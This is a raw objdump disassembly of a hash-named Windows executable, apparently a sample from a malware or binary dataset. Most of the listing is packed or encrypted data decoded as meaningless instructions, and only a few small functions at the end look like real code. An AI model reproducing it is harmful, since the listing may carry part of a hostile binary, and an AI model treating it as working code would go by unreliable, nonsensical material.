
b6e5266594990ec4c62e449a987aef1f4dedfaba724b174c5cf3e2bdbd5e1684.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	js     0x4cff82
  4d0002:	and    BYTE PTR [edi+0x26],dh
  4d0005:	cmp    DWORD PTR [ecx],0x49
  4d0008:	cmp    al,0x5f
  4d000a:	inc    ecx
  4d000b:	addr16 add eax,0x8021dd22
  4d0011:	mov    ebx,0x640c16f0
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	dec    ebx
  4d06c1:	adc    edx,ebx
  4d06c3:	stos   DWORD PTR es:[edi],eax
  4d06c4:	xchg   edi,eax
  4d06c5:	pop    ebp
  4d06c6:	shrd   DWORD PTR [ecx],ecx,0xe5
  4d06ca:	data16 neg ax
  4d06ce:	repz das 
  4d06d0:	sbb    dh,BYTE PTR [esi-0x5a]
  4d06d3:	call   0xd7d2f92d
  4d06d8:	dec    edx
  4d06d9:	nop
  4d06da:	mov    ebx,0x1180f227
  4d06df:	sbb    eax,0x80fcd525
  4d06e4:	jno    0x4d0671
  4d06e6:	inc    BYTE PTR [esi+0x5a]
  4d06e9:	xchg   esi,eax
  4d06ea:	dec    edx
  4d06eb:	hlt    
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d2044
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x44
  4d0700:	lea    edi,ds:0x4d3048
  4d0706:	add    DWORD PTR [ebp-0x40],eax
  4d0709:	push   edi
  4d070a:	mov    eax,0x0
  4d070f:	push   eax
  4d0710:	call   0x4d15a8
  4d0715:	add    esp,0x4
  4d0718:	pop    edi
  4d0719:	push   edi
  4d071a:	push   ebx
  4d071b:	push   DWORD PTR [edi+0x184]
  4d0721:	call   0x4d134c
  4d0726:	add    esp,0x8
  4d0729:	pop    edi
  4d072a:	push   edi
  4d072b:	call   0x4d0d58
  4d0730:	add    esp,0x4
  4d0733:	pop    edi
  4d0734:	add    esp,0x44
  4d0737:	pop    ebp
  4d0738:	ret    
  4d0739:	add    BYTE PTR [eax],al
  4d073b:	add    BYTE PTR [edi-0x1],bl
  4d073e:	adc    eax,0x4d204c
  4d0743:	call   edi
  4d0745:	add    BYTE PTR [eax],al
  4d0747:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d074d:	sub    esp,0x40
  4d0750:	mov    ebx,0x4d312c
  4d0755:	mov    esi,ebx
  4d0757:	mov    ecx,0x0
  4d075c:	push   ecx
  4d075d:	call   0x4d1218
  4d0762:	add    esp,0x4
  4d0765:	push   ebx
  4d0766:	push   DWORD PTR [ebx+0xf8]
  4d076c:	push   edx
  4d076d:	push   esi
  4d076e:	push   eax
  4d076f:	call   0x4d0abc
  4d0774:	add    esp,0x10
  4d0777:	pop    ebx
  4d0778:	mov    esi,0x4d2020
  4d077d:	mov    esi,DWORD PTR [esi]
  4d077f:	push   esi
  4d0780:	push   DWORD PTR [ebx-0xb8]
  4d0786:	pop    ecx
  4d0787:	call   ecx
  4d0789:	add    esp,0x40
  4d078c:	pop    ebp
  4d078d:	ret    
  4d078e:	add    BYTE PTR [eax],al
  4d0790:	mov    edi,edi
